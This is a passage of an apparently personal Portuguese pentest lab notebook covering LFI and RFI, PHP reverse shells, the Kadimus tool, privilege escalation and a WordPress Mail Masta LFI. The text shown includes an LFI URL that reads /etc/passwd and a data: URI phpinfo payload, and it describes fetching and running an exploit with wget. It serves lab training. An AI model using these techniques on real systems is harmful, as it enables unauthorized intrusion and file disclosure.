+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ac00b4bc-9be9-4077-93a7-f9d8637b48fa/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Esse arquivo que o linpeas trouxe, vamos fazer um cat</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ca917ce6-c230-4f4c-a96b-9637bdc85131/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Parece que nos trouxe uma senha…Vamos tentar acessar via ssh</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f22f5042-cbd3-4437-b5ec-2656bae1fd55/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Acesso com sucesso</p>
+<p>========================================</p>
+<h2>Local File Include (LFI)</h2>
+<p>LAB</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1c977107-3298-413e-9b5e-0da84215ae75/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Verificando se conseguimos ler o passwd e o phpinfo (data:text/plaintext,&lt;?php phpinfo();?&gt;)</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4b5fc12e-fce0-4e5d-a4f7-a835b70e99c0/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2e4922f9-4c73-4ac9-8503-701eb567f935/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos criar um reverse shell automatico para php</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f3d28982-fe76-4278-9999-1b3a1a21e8f7/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Executando shell reverso</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6e95180e-36b1-4c17-a029-c9f1905aaf0f/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos escalar privilégio</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8501f6d6-c0d0-44ab-be65-b8d99f1a26d3/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos procurar um exploit para essa versão</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0d1ea563-654a-4677-8164-7511925df7f8/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Baixamos para a nossa máquina no /tmp e subimos um PYTHON na porta 80. depois fizemos um wget, baixamos o arquivo e executamos, explorando o LFI e pegando a flag</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b6161c2c-64f7-4edb-af5c-ed3a0dd1bfe9/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>b6f49f8c75b2c6085aa2a5ece1134b97</p>
+<p>Com sucesso….</p>
+<p>Vamos fazer um RFI…</p>
+<p>Que é invocar algo hospedado fora …</p>
+<p>Temos um shell reverso na nossa máquina, abrimos um python 80 e chamamos na página, observer que foi aberto a comunicação com a nossa máquina…</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a082f246-6cfc-4bd5-98da-499fb4ae7d25/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p><code>Existe uma ferramenta automatizada chamada Kadimus</code></p>
+<p><a href="https://github.com/P0cL4bs/kadimus.git" target="_blank" rel="noopener noreferrer">https://github.com/P0cL4bs/kadimus.git</a></p>
+<p>Também é necessário baixar essa lib</p>
+<p>apt-get install libcurl4-nss-dev libpcre3-dev libssh-dev</p>
+<p>Depois rodamos o comando ‘make’ e está pronto</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/186e8f5c-8c40-44d7-a636-237974bc972b/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Como sabemos qual é a URL, vamos rodar um comando para saber se é vulnerável a LFI ou RFI</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5b30ef65-fa30-491b-a722-88348e443feb/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Feito….</p>
+<p>Agora vamos rodar um shell reverso com Kadimus</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e9d20f1b-73e9-4f9e-8ac7-dec2838b304f/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>===============================================</p>
+<p>Novo LAB</p>
+<p>Máquina 129</p>
+<p>rodamos um <b>nikto</b> para ver maiores detalhes da página e descobrimos que é um WORDPRESS, então rodamos um <b>WPSCAN</b> para encontrar as vulnerabilidades</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/23eb5d5c-5ef0-4db5-be0b-bd06a994c260/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Encontramos um LFI</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/271d8c6f-055c-45f7-b389-52a9c78c0016/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Procurando exploit</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/41611120-679c-456f-8a98-04a3f1ddc308/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Baixando e Abrindo o TXT 40290, encontramos uma info importante que é o caminho onde está a vulnerabilidade desse wordpress</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/349b7815-cfb9-452d-a0ab-6dabbc9026a0/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Adaptando para o nosso ambiente:</p>
+<p><a href="http://192.168.0.26/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd" target="_blank" rel="noopener noreferrer">http://192.168.0.26/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</a></p>
+<p>Executando:</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f295d608-4301-4c24-8c16-7a752d79023f/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+    
+    <p class="art-meta art-foot">Nota do meu segundo cérebro (Obsidian), publicada aqui. Conteúdo próprio.</p>
+  </article>
+</main>
+<footer class="site-foot"><div class="wrap"><p>&copy; 2026 Julio Cataldo. <span class="foot-quote">&ldquo;Dedicated to safeguarding digital frontiers, navigating the cyber realms with resilience, and championing cybersecurity as a cornerstone of our digital future.&rdquo;</span></p></div></footer>
+</body>
+</html>
